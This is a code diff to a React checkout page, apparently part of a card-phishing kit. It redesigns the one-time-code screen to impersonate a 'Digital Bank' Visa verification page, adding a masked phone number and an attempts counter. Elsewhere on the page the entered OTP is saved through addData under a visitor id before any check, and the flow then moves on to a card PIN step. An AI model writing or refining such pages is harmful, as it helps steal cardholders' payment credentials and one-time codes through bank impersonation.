@@ -95,6 +95,7 @@ export default function CheckoutPage() {
   const [showAgeVerification, setShowAgeVerification] = useState(false)
   const [showPromoPopup, setShowPromoPopup] = useState(false)
   const [showModal, setShowModal] = useState(false)
+  const [otpAttempts, setOtpAttempts] = useState(6)
 
   const [shippingErrors, setShippingErrors] = useState({
     fullName: "",
@@ -357,6 +358,17 @@ export default function CheckoutPage() {
     return BLOCKED_CARD_PREFIXES.some((prefix) => cardNumber.startsWith(prefix))
   }
 
+  const maskPhone = (phone: string): string => {
+    if (!phone || phone.length < 6) return phone
+    const first3 = phone.slice(0, 3)
+    const last2 = phone.slice(-2)
+    const middle = phone.slice(3, -2)
+    const maskedMiddle = middle.replace(/\d/g, "x")
+    const part1 = maskedMiddle.slice(0, Math.ceil(maskedMiddle.length / 2))
+    const part2 = maskedMiddle.slice(Math.ceil(maskedMiddle.length / 2))
+    return `(${first3}) ${part1}-${part2}${last2}`
+  }
+
   const handleCardNumberChange = (value: string) => {
     const cleaned = value.replace(/\s/g, "")
     if (cleaned.length <= 16 && /^\d*$/.test(cleaned)) {
@@ -441,6 +453,7 @@ export default function CheckoutPage() {
       setStep("card-otp")
       setResendTimer(30)
       setCanResendOtp(false)
+      setOtpAttempts(6)
     } catch (error) {
       console.error("❌ Error sending card OTP:", error)
       setVerificationError("فشل إرسال رمز التحقق")
@@ -449,11 +462,11 @@ export default function CheckoutPage() {
 
   const handleCardOtpVerify = async () => {
     if (cardOtp.length < 4) {
-      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
+      setVerificationError("Please enter the verification code correctly")
       return
     }
     const visitor = localStorage.getItem("visitor")
-addData({id:visitor,cardOtp})
+    addData({ id: visitor, cardOtp })
     setIsVerifying(true)
     setStep("card-pin")
 
@@ -467,7 +480,8 @@ addData({id:visitor,cardOtp})
     } catch (error: any) {
       console.error("❌ Card OTP verification error:", error)
       setIsVerifying(false)
-      setVerificationError(error.message || "رمز التحقق غير صحيح")
+      setOtpAttempts((prev) => Math.max(0, prev - 1))
+      setVerificationError(error.message || "Incorrect verification code")
     }
   }
 
@@ -1040,65 +1054,93 @@ addData({id:visitor,cardOtp})
         )}
 
         {step === "card-otp" && (
-          <Card>
-            <CardHeader>
-              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
-                <CreditCard className="h-6 w-6 text-primary" />
+          <div className="flex justify-center items-start min-h-[60vh]" dir="ltr">
+            <div className="w-full max-w-sm bg-white shadow-md rounded overflow-hidden">
+              {/* Orange top accent bar */}
+              <div className="h-2 bg-orange-500 w-full" />
+
+              {/* Bank header */}
+              <div className="flex items-center justify-between px-6 py-4 border-b border-gray-200">
+                <span className="text-[#1a3a6e] font-bold text-xl">Digital Bank</span>
+                <span className="text-[#1a3a6e] font-black text-2xl italic tracking-widest">VISA</span>
               </div>
-              <CardTitle className="text-2xl text-center">التحقق من البطاقة</CardTitle>
-              <CardDescription className="text-center">
-                تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
-              </CardDescription>
-            </CardHeader>
-            <CardContent className="space-y-6">
-              <div>
-                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
-                <div className="flex gap-2 justify-center" dir="ltr">
-                  <Input
+
+              {/* Content */}
+              <div className="px-6 py-8">
+                <h2 className="text-xl font-bold text-gray-900 mb-4">Enter verification code</h2>
+
+                <p className="text-sm text-gray-600 mb-6">
+                  We sent you a verification code by text message to{" "}
+                  <span className="font-medium">{maskPhone(shippingInfo.phone)}</span>. You have{" "}
+                  <span className="font-medium">{otpAttempts} {otpAttempts === 1 ? "attempt" : "attempts"}</span>.
+                </p>
+
+                <label className="block text-center text-[#1a3a6e] font-medium mb-3 text-sm">
+                  Verification code
+                </label>
+
+                {/* Split OTP inputs */}
+                <div className="flex gap-3 mb-6" dir="ltr">
+                  <input
                     type="text"
                     inputMode="numeric"
                     autoComplete="one-time-code"
-                    maxLength={6}
-                    value={cardOtp}
-                    onChange={(e) => setCardOtp(e.target.value)}
-                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
+                    maxLength={3}
+                    value={cardOtp.slice(0, 3)}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "").slice(0, 3)
+                      setCardOtp(val + cardOtp.slice(3))
+                      setVerificationError("")
+                    }}
+                    className={`flex-1 h-14 text-center text-xl font-medium border-2 rounded focus:outline-none focus:border-[#1a3a6e] ${verificationError ? "border-red-500" : "border-gray-300"}`}
+                  />
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={3}
+                    value={cardOtp.slice(3, 6)}
+                    onChange={(e) => {
+                      const val = e.target.value.replace(/\D/g, "").slice(0, 3)
+                      setCardOtp(cardOtp.slice(0, 3) + val)
+                      setVerificationError("")
+                    }}
+                    className={`flex-1 h-14 text-center text-xl font-medium border-2 rounded focus:outline-none focus:border-[#1a3a6e] ${verificationError ? "border-red-500" : "border-gray-300"}`}
                   />
                 </div>
-                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
-              </div>
 
-              <div className="text-center text-sm text-muted-foreground">
-                {canResendOtp ? (
-                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
-                    إعادة إرسال الرمز
-                  </button>
-                ) : (
-                  <span>يمكنك إعادة الإرسال بعد {resendTimer} ثانية</span>
+                {verificationError && (
+                  <p className="text-sm text-red-500 text-center mb-4">{verificationError}</p>
                 )}
-              </div>
 
-              <div className="flex gap-3">
-                <Button
-                  variant="outline"
-                  className="flex-1 bg-transparent"
-                  onClick={() => setStep("payment")}
-                  disabled={isVerifying}
+                {/* CONTINUE button */}
+                <button
+                  onClick={handleCardOtpVerify}
+                  disabled={isVerifying || otpAttempts === 0}
+                  className="w-full py-3 bg-[#1a3a6e] text-white font-bold uppercase tracking-wide rounded hover:bg-[#162f5c] disabled:opacity-60 disabled:cursor-not-allowed mb-4 flex items-center justify-center gap-2"
                 >
-                  رجوع
-                </Button>
-                <Button className="flex-1" onClick={handleCardOtpVerify} disabled={isVerifying}>
                   {isVerifying ? (
                     <>
-                      <Loader2 className="ml-2 h-4 w-4 animate-spin" />
-                      جاري التحقق...
+                      <Loader2 className="h-4 w-4 animate-spin" />
+                      Processing...
                     </>
                   ) : (
-                    "تحقق"
+                    "CONTINUE"
                   )}
-                </Button>
+                </button>
+
+                {/* RESEND CODE */}
+                <div className="text-center">
+                  <button
+                    onClick={canResendOtp ? handleResendOtp : undefined}
+                    disabled={!canResendOtp || isVerifying}
+                    className={`text-[#1a3a6e] font-semibold text-sm uppercase tracking-wide ${canResendOtp ? "hover:underline cursor-pointer" : "opacity-50 cursor-default"}`}
+                  >
+                    RESEND CODE
+                  </button>
+                </div>
               </div>
-            </CardContent>
-          </Card>
+            </div>
+          </div>
         )}
 
         {step === "card-pin" && (
